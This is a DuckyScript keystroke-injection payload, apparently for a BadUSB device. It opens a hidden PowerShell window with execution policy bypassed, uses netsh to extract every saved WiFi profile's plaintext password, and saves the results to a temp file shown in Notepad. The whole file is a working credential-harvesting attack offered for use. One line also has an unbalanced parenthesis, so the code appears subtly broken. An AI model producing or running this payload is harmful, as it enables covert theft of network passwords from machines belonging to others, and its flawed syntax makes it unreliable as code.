REM Title: Windows WiFi Password Extractor
REM Description: Extracts all saved WiFi profiles and their plaintext passwords
REM Target OS: Windows 10/11
REM Author: DoctorSonic

DELAY 1000
GUI r
DELAY 600
STRING powershell -NoP -NonI -W Hidden -Exec Bypass
ENTER
DELAY 1200
STRING $o='=== SAVED WIFI PASSWORDS ===';$o+=[Environment]::NewLine
ENTER
DELAY 300
STRING (netsh wlan show profiles) -match 'All User Profile' -replace '.*: ','') | ForEach-Object { $p=$_; $k=(netsh wlan show profile name=$p key=clear) -match 'Key Content' -replace '.*: ',''; $o+="SSID: $p  |  Password: $k`n" }
ENTER
DELAY 1000
STRING $o | Out-File $env:TEMP\\wifipass.txt; Start-Process notepad $env:TEMP\\wifipass.txt
ENTER
DELAY 1500
